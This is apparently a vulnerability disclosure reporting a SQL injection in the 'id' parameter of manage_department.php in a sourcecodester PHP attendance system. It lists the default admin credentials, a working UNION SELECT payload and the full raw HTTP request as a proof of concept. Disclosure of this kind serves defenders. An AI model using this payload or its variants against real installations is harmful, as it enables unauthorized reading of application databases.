# Online Employees Work From Home Attendance System v1.0 by sourcecodester has SQL injection 1

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14981/online-employees-work-home-attendance-system-php-and-sqlite-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /wfh_attendance/admin/manage_department.php

Vulnerability location: /wfh_attendance/admin/manage_department.php?id=, id

[+] Payload: /wfh_attendance/admin/manage_department.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ // Leak place ---> id

```sql
GET /wfh_attendance/admin/manage_department.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mjsuoc4jice3ps6orhn4u8t5vk
Connection: close


```

<img width="1016" height="423" alt="image" src="https://github.com/user-attachments/assets/ba07735f-23b1-488b-9692-bad10e329345" />
